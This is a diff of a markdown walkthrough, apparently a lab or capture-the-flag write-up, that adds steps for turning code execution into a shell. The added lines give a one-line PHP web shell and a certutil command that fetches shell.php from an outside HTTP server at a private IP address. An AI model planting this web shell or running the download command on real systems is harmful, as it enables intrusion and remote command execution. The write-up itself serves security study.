@@ -67,5 +67,22 @@ We need to launch the exploit:
 
 Great, the code is successfully getting executed! Now we need to work on the actual SHELL.PHP payload
 
-  
+Here are the steps -- Please see the picture below for a visual illustration:
+
+1) Generate a simple web shell in localhost: 
+
+```sh
+<?php echo shell_exec($_GET["cmd"]); ?>
+```
+
+2) Transfer PHP payload through an HTTP server 
+
+```sh
+'exec("certutil.exe -urlcache -f http://10.18.123.93:8000/shell.php shell.php");'
+```
+
+3) Refresh the browser and trigger the process. 
+
+![Screenshot 2022-05-29 215707](https://user-images.githubusercontent.com/99097743/170910606-a77516e1-d2b4-4451-9e6f-f0e397f16a54.png)
+
 
